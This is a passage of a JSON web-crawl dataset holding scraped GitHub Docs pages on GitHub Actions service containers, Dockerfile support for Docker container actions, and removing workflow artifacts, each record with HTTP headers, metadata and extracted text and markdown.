      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "2CB8:18ED:4EC23F:6D7932:681C5298",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:43:36 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21943-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686617.696045, VS0, VE286",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22855",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using containerized services - GitHub Docs\nYou can use containerized services in your GitHub Actions workflows.\nAbout service containers\nYou can use service containers to connect databases, web services, memory caches, and other tools to your workflow.\nCreating PostgreSQL service containers\nYou can create a PostgreSQL service container to use in your workflow. This guide shows examples of creating a PostgreSQL service for jobs that run in containers or directly on the runner machine.\nCreating Redis service containers\nYou can use service containers to create a Redis client in your workflow. This guide shows examples of creating a Redis service for jobs that run in containers or directly on the runner machine.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-p5b1v.html",
  "markdown": "# Using containerized services - GitHub Docs\n\nYou can use containerized services in your GitHub Actions workflows.\n\n## [About service containers](https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)\n\nYou can use service containers to connect databases, web services, memory caches, and other tools to your workflow.\n\n## [Creating PostgreSQL service containers](https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers)\n\nYou can create a PostgreSQL service container to use in your workflow. This guide shows examples of creating a PostgreSQL service for jobs that run in containers or directly on the runner machine.\n\n## [Creating Redis service containers](https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers)\n\nYou can use service containers to create a Redis client in your workflow. This guide shows examples of creating a Redis service for jobs that run in containers or directly on the runner machine.",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 200,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-using-containerized-services-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1238,
      "readableText": 1545,
      "none": 3131,
      "readableTextIfPossible": 3131,
      "result": 1545,
      "markdown": 1103
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions",
    "loadedTime": "2025-05-08T06:43:54.417Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions",
    "title": "Dockerfile support for GitHub Actions - GitHub Docs",
    "description": "When creating a Dockerfile for a Docker container action, you should be aware of how some Docker instructions interact with GitHub Actions and an action's metadata file.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Dockerfile support for GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "27417",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "605B:FE214:F6A785:1403106:681C529C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:43:54 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686634.047196,VS0,VE283",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Dockerfile support for GitHub Actions\nWhen creating a Dockerfile for a Docker container action, you should be aware of how some Docker instructions interact with GitHub Actions and an action's metadata file.\nAbout Dockerfile instructions\nA Dockerfile contains instructions and arguments that define the contents and startup behavior of a Docker container. For more information about the instructions Docker supports, see Dockerfile reference in the Docker documentation.\nDockerfile instructions and overrides\nSome Docker instructions interact with GitHub Actions, and an action's metadata file can override some Docker instructions. Ensure that you are familiar with how your Dockerfile interacts with GitHub Actions to prevent any unexpected behavior.\nUSER\nDocker actions must be run by the default Docker user (root). Do not use the USER instruction in your Dockerfile, because you won't be able to access the GITHUB_WORKSPACE directory. For more information, see Store information in variables and USER reference in the Docker documentation.\nFROM\nThe first instruction in the Dockerfile must be FROM, which selects a Docker base image. For more information, see the FROM reference in the Docker documentation.\nThese are some best practices when setting the FROM argument:\nIt's recommended to use official Docker images. For example, python or ruby.\nUse a version tag if it exists, preferably with a major version. For example, use node:10 instead of node:latest.\nIt's recommended to use Docker images based on the Debian operating system.\nWORKDIR\nGitHub sets the working directory path in the GITHUB_WORKSPACE environment variable. It's recommended to not use the WORKDIR instruction in your Dockerfile. Before the action executes, GitHub will mount the GITHUB_WORKSPACE directory on top of anything that was at that location in the Docker image and set GITHUB_WORKSPACE as the working directory. For more information, see Store information in variables and the WORKDIR reference in the Docker documentation.\nENTRYPOINT\nIf you define entrypoint in an action's metadata file, it will override the ENTRYPOINT defined in the Dockerfile. For more information, see Metadata syntax for GitHub Actions.\nThe Docker ENTRYPOINT instruction has a shell form and exec form. The Docker ENTRYPOINT documentation recommends using the exec form of the ENTRYPOINT instruction. For more information about exec and shell form, see the ENTRYPOINT reference in the Docker documentation.\nYou should not use WORKDIR to specify your entrypoint in your Dockerfile. Instead, you should use an absolute path. For more information, see WORKDIR.\nIf you configure your container to use the exec form of the ENTRYPOINT instruction, the args configured in the action's metadata file won't run in a command shell. If the action's args contain an environment variable, the variable will not be substituted. For example, using the following exec format will not print the value stored in $GITHUB_SHA, but will instead print \"$GITHUB_SHA\".\nENTRYPOINT [\"echo $GITHUB_SHA\"] \nIf you want variable substitution, then either use the shell form or execute a shell directly. For example, using the following exec format, you can execute a shell to print the value stored in the GITHUB_SHA environment variable.\nENTRYPOINT [\"sh\", \"-c\", \"echo $GITHUB_SHA\"] \nTo supply args defined in the action's metadata file to a Docker container that uses the exec form in the ENTRYPOINT, we recommend creating a shell script called entrypoint.sh that you call from the ENTRYPOINT instruction:\nExample Dockerfile\n# Container image that runs your code FROM debian:9.5-slim # Copies your code file from your action repository to the filesystem path `/` of the container COPY entrypoint.sh /entrypoint.sh # Executes `entrypoint.sh` when the Docker container starts up ENTRYPOINT [\"/entrypoint.sh\"] \nExample entrypoint.sh file\nUsing the example Dockerfile above, GitHub will send the args configured in the action's metadata file as arguments to entrypoint.sh. Add the #!/bin/sh shebang at the top of the entrypoint.sh file to explicitly use the system's POSIX-compliant shell.\n#!/bin/sh # `$#` expands to the number of arguments and `$@` expands to the supplied `args` printf '%d args:' \"$#\" printf \" '%s'\" \"$@\" printf '\\n' \nYour code must be executable. Make sure the entrypoint.sh file has execute permissions before using it in a workflow. You can modify the permission from your terminal using this command:\nchmod +x entrypoint.sh \nWhen an ENTRYPOINT shell script is not executable, you'll receive an error similar to this:\nError response from daemon: OCI runtime create failed: container_linux.go:348: starting container process caused \"exec: \\\"/entrypoint.sh\\\": permission denied\": unknown \nCMD\nIf you define args in the action's metadata file, args will override the CMD instruction specified in the Dockerfile. For more information, see Metadata syntax for GitHub Actions.\nIf you use CMD in your Dockerfile, follow these guidelines:\nDocument required arguments in the action's README and omit them from the CMD instruction.\nUse defaults that allow using the action without specifying any args.\nIf the action exposes a --help flag, or something similar, use that to make your action self-documenting.\nSupported Linux capabilities\nGitHub Actions supports the default Linux capabilities that Docker supports. Capabilities can't be added or removed. For more information about the default Linux capabilities that Docker supports, see Linux kernel capabilities in the Docker documentation. To learn more about Linux capabilities, see Overview of Linux capabilities in the Linux man-pages.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-1oxdd.html",
  "markdown": "# Dockerfile support for GitHub Actions\n\nWhen creating a `Dockerfile` for a Docker container action, you should be aware of how some Docker instructions interact with GitHub Actions and an action's metadata file.\n\n## [About Dockerfile instructions](#about-dockerfile-instructions)\n\nA `Dockerfile` contains instructions and arguments that define the contents and startup behavior of a Docker container. For more information about the instructions Docker supports, see [Dockerfile reference](https://docs.docker.com/engine/reference/builder/) in the Docker documentation.\n\n## [Dockerfile instructions and overrides](#dockerfile-instructions-and-overrides)\n\nSome Docker instructions interact with GitHub Actions, and an action's metadata file can override some Docker instructions. Ensure that you are familiar with how your Dockerfile interacts with GitHub Actions to prevent any unexpected behavior.\n\n### [USER](#user)\n\nDocker actions must be run by the default Docker user (root). Do not use the `USER` instruction in your `Dockerfile`, because you won't be able to access the `GITHUB_WORKSPACE` directory. For more information, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables#default-environment-variables) and [USER reference](https://docs.docker.com/engine/reference/builder/#user) in the Docker documentation.\n\n### [FROM](#from)\n\nThe first instruction in the `Dockerfile` must be `FROM`, which selects a Docker base image. For more information, see the [FROM reference](https://docs.docker.com/engine/reference/builder/#from) in the Docker documentation.\n\nThese are some best practices when setting the `FROM` argument:\n\n*   It's recommended to use official Docker images. For example, `python` or `ruby`.\n*   Use a version tag if it exists, preferably with a major version. For example, use `node:10` instead of `node:latest`.\n*   It's recommended to use Docker images based on the [Debian](https://www.debian.org/) operating system.\n\n### [WORKDIR](#workdir)\n\nGitHub sets the working directory path in the `GITHUB_WORKSPACE` environment variable. It's recommended to not use the `WORKDIR` instruction in your `Dockerfile`. Before the action executes, GitHub will mount the `GITHUB_WORKSPACE` directory on top of anything that was at that location in the Docker image and set `GITHUB_WORKSPACE` as the working directory. For more information, see [Store information in variables](https://docs.github.com/en/actions/learn-github-actions/variables#default-environment-variables) and the [WORKDIR reference](https://docs.docker.com/engine/reference/builder/#workdir) in the Docker documentation.\n\n### [ENTRYPOINT](#entrypoint)\n\nIf you define `entrypoint` in an action's metadata file, it will override the `ENTRYPOINT` defined in the `Dockerfile`. For more information, see [Metadata syntax for GitHub Actions](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runsentrypoint).\n\nThe Docker `ENTRYPOINT` instruction has a _shell_ form and _exec_ form. The Docker `ENTRYPOINT` documentation recommends using the _exec_ form of the `ENTRYPOINT` instruction. For more information about _exec_ and _shell_ form, see the [ENTRYPOINT reference](https://docs.docker.com/engine/reference/builder/#entrypoint) in the Docker documentation.\n\nYou should not use `WORKDIR` to specify your entrypoint in your Dockerfile. Instead, you should use an absolute path. For more information, see [WORKDIR](#workdir).\n\nIf you configure your container to use the _exec_ form of the `ENTRYPOINT` instruction, the `args` configured in the action's metadata file won't run in a command shell. If the action's `args` contain an environment variable, the variable will not be substituted. For example, using the following _exec_ format will not print the value stored in `$GITHUB_SHA`, but will instead print `\"$GITHUB_SHA\"`.\n\n```\nENTRYPOINT [\"echo $GITHUB_SHA\"]\n```\n\nIf you want variable substitution, then either use the _shell_ form or execute a shell directly. For example, using the following _exec_ format, you can execute a shell to print the value stored in the `GITHUB_SHA` environment variable.\n\n```\nENTRYPOINT [\"sh\", \"-c\", \"echo $GITHUB_SHA\"]\n```\n\nTo supply `args` defined in the action's metadata file to a Docker container that uses the _exec_ form in the `ENTRYPOINT`, we recommend creating a shell script called `entrypoint.sh` that you call from the `ENTRYPOINT` instruction:\n\n#### [Example _Dockerfile_](#example-dockerfile)\n\n```\n# Container image that runs your code\nFROM debian:9.5-slim\n\n# Copies your code file from your action repository to the filesystem path `/` of the container\nCOPY entrypoint.sh /entrypoint.sh\n\n# Executes `entrypoint.sh` when the Docker container starts up\nENTRYPOINT [\"/entrypoint.sh\"]\n```\n\n#### [Example _entrypoint.sh_ file](#example-entrypointsh-file)\n\nUsing the example Dockerfile above, GitHub will send the `args` configured in the action's metadata file as arguments to `entrypoint.sh`. Add the `#!/bin/sh` [shebang](https://en.wikipedia.org/wiki/Shebang_\\(Unix\\)) at the top of the `entrypoint.sh` file to explicitly use the system's [POSIX](https://en.wikipedia.org/wiki/POSIX)\\-compliant shell.\n\n```\n#!/bin/sh\n\n# `$#` expands to the number of arguments and `$@` expands to the supplied `args`\nprintf '%d args:' \"$#\"\nprintf \" '%s'\" \"$@\"\nprintf '\\n'\n```\n\nYour code must be executable. Make sure the `entrypoint.sh` file has `execute` permissions before using it in a workflow. You can modify the permission from your terminal using this command:\n\n```\nchmod +x entrypoint.sh\n```\n\nWhen an `ENTRYPOINT` shell script is not executable, you'll receive an error similar to this:\n\n```\nError response from daemon: OCI runtime create failed: container_linux.go:348: starting container process caused \"exec: \\\"/entrypoint.sh\\\": permission denied\": unknown\n```\n\n### [CMD](#cmd)\n\nIf you define `args` in the action's metadata file, `args` will override the `CMD` instruction specified in the `Dockerfile`. For more information, see [Metadata syntax for GitHub Actions](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runsargs).\n\nIf you use `CMD` in your `Dockerfile`, follow these guidelines:\n\n1.  Document required arguments in the action's README and omit them from the `CMD` instruction.\n2.  Use defaults that allow using the action without specifying any `args`.\n3.  If the action exposes a `--help` flag, or something similar, use that to make your action self-documenting.\n\n## [Supported Linux capabilities](#supported-linux-capabilities)\n\nGitHub Actions supports the default Linux capabilities that Docker supports. Capabilities can't be added or removed. For more information about the default Linux capabilities that Docker supports, see [Linux kernel capabilities](https://docs.docker.com/engine/security/#linux-kernel-capabilities) in the Docker documentation. To learn more about Linux capabilities, see [Overview of Linux capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) in the Linux man-pages.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 227,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-dockerfile-support-for-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 10422,
      "readableText": 9188,
      "none": 12237,
      "readableTextIfPossible": 9188,
      "result": 9188,
      "markdown": 7074
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts",
    "loadedTime": "2025-05-08T06:43:57.128Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts",
    "title": "Removing workflow artifacts - GitHub Docs",
    "description": "You can reclaim used GitHub Actions storage by deleting artifacts before they expire on GitHub.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Removing workflow artifacts - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "26032",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "605B:FE214:F6AF87:1403A86:681C52AA",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:43:57 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000079-IAD",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686637.801052,VS0,VE273",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Removing workflow artifacts - GitHub Docs\nYou can reclaim used GitHub Actions storage by deleting artifacts before they expire on GitHub.\nDeleting an artifact\nWarning\nOnce you delete an artifact, it cannot be restored.\nWrite access to the repository is required to perform these steps.\nBy default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, see Usage limits, billing, and administration.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nUnder Artifacts, click next to the artifact you want to remove.\nSetting the retention period for an artifact\nRetention periods for artifacts and logs can be configured at the repository, organization, and enterprise level. For more information, see Usage limits, billing, and administration.\nYou can also define a custom retention period for individual artifacts using the actions/upload-artifact action in a workflow. For more information, see Storing and sharing data from a workflow.\nFinding the expiration date of an artifact\nYou can use the API to confirm the date that an artifact is scheduled to be deleted. For more information, see the expires_at value returned by the REST API. For more information, see REST API endpoints for GitHub Actions artifacts.\nArtifacts from deleted workflow runs\nWhen a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see: Deleting a workflow run, Delete a workflow run, or gh run delete.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-cuggj.html",
  "markdown": "# Removing workflow artifacts - GitHub Docs\n\nYou can reclaim used GitHub Actions storage by deleting artifacts before they expire on GitHub.\n\n## [Deleting an artifact](#deleting-an-artifact)\n\nWarning\n\nOnce you delete an artifact, it cannot be restored.\n\nWrite access to the repository is required to perform these steps.\n\nBy default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, see [Usage limits, billing, and administration](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#artifact-and-log-retention-policy).\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  Under **Artifacts**, click next to the artifact you want to remove.\n    \n    ![Screenshot showing artifacts created during a workflow run. A trash can icon, used to remove an artifact, is outlined in dark orange.](https://docs.github.com/assets/cb-14510/images/help/repository/actions-delete-artifact-updated.png)\n    \n\n## [Setting the retention period for an artifact](#setting-the-retention-period-for-an-artifact)\n\nRetention periods for artifacts and logs can be configured at the repository, organization, and enterprise level. For more information, see [Usage limits, billing, and administration](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#artifact-and-log-retention-policy).\n\nYou can also define a custom retention period for individual artifacts using the `actions/upload-artifact` action in a workflow. For more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts#configuring-a-custom-artifact-retention-period).\n\n## [Finding the expiration date of an artifact](#finding-the-expiration-date-of-an-artifact)\n\nYou can use the API to confirm the date that an artifact is scheduled to be deleted. For more information, see the `expires_at` value returned by the REST API. For more information, see [REST API endpoints for GitHub Actions artifacts](https://docs.github.com/en/rest/actions/artifacts).\n\n## [Artifacts from deleted workflow runs](#artifacts-from-deleted-workflow-runs)\n\nWhen a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see: [Deleting a workflow run](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run), [Delete a workflow run](https://docs.github.com/en/rest/actions/workflow-runs?apiVersion=2022-11-28#delete-a-workflow-run), or [gh run delete](https://cli.github.com/manual/gh_run_delete).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 214,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-removing-workflow-artifacts-readableTextIfPossibleHtm"
    },
    "lengths": {
      "extractus": 5168,
      "readableText": 4746,
      "none": 6615,
      "readableTextIfPossible": 6615,
      "result": 4746,
      "markdown": 3432
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run",
    "loadedTime": "2025-05-08T06:43:59.346Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run",
    "title": "Deleting a workflow run - GitHub Docs",
    "description": "You can delete a workflow run that has been completed, or is more than two weeks old.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deleting a workflow run - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "24295",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "09AC:DDD08:71C414:95CD29:681C0D13",
      "content-encoding": "br",
      "accept-ranges": "bytes",
